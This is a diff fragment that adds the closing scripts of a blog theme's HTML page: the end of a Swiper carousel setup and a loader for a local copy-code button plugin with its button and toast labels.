+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
